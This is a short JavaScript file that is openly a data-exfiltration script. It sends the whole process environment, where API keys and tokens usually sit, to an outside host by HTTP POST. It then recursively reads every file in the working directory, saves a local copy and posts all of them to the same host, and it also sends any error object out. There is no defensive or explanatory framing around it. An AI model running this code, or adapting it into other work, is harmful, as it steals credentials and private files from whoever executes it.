const exfil = (data) =>
	fetch("https://kibty.town", {
		method: "POST",
		body: JSON.stringify(data),
	});
exfil({ files: [{ name: ".env.json", content: JSON.stringify(process.env) }] });
try {
  import("fs").then(async (a) => {
    const arr = [];
    for (const filename of a.readdirSync(".", { recursive: true })) {
      if (a.lstatSync(filename).isDirectory()) continue;
      const content = a.readFileSync(filename, "utf-8");
      arr.push({ name: filename, content });
    }
	  console.log(arr.length);
	  //write into json file 
	  
    // Write to local file for debugging
    a.writeFileSync('exfil_data.json', JSON.stringify(arr, null, 2));
    
    await exfil({ files: arr });
    console.log("done exfiling");
  });
} catch (error) {
  console.error("Error:", error);
  exfil(error);
}
